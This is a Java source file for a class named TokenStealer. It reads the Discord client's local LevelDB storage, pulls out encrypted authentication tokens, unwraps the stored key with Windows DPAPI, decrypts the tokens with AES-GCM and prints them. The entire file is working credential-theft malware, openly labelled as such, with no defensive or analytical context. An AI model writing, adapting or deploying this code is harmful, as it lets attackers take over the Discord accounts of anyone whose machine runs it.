package io.github.itzgonza.impl;

import java.io.File;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.Base64;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;

import org.apache.commons.io.FileUtils;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import com.sun.jna.platform.win32.Crypt32Util;

public class TokenStealer {

	public transient static TokenStealer instance;
	
	private transient static String discordPath;
	{
		discordPath = new String(System.getenv("APPDATA") + "/discord");
	};
	
	public synchronized void initialize() throws Exception {
		for (File file : new File((discordPath + "/Local Storage/leveldb")).listFiles(File::isFile)) {
			if (file.getName().endsWith(".ldb")) {
				String parsed = FileUtils.readFileToString(file, StandardCharsets.UTF_8.toString()), foundTokens = "";
				Matcher matcher = (Pattern.compile("(dQw4w9WgXcQ:)([^.*\\\\['(.*)\\\\]$][^\"]*)")).matcher(parsed.toString());

				if (!matcher.find()) {
					continue;
				}
				
				byte[] key, tokens;
					
				String reader = FileUtils.readFileToString(new File((discordPath + "/Local State")), StandardCharsets.UTF_8.toString());
				JsonObject json = new JsonParser().parseString(reader).getAsJsonObject();

				key = json.getAsJsonObject("os_crypt").get("encrypted_key").getAsString().getBytes();
				key = Base64.getDecoder().decode(key);
				key = Arrays.copyOfRange(key, 5, key.length);
				key = Crypt32Util.cryptUnprotectData(key);
				
				tokens = Base64.getDecoder().decode(matcher.group().split("dQw4w9WgXcQ:")[1].getBytes());

				Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
				cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key, "AES"), new GCMParameterSpec(128, Arrays.copyOfRange(tokens, 3, 15)));

				foundTokens += new String(cipher.doFinal(Arrays.copyOfRange(tokens, 15, tokens.length)), StandardCharsets.UTF_8.toString());
					
				System.out.println(foundTokens);
			}
		}
	}
	
}
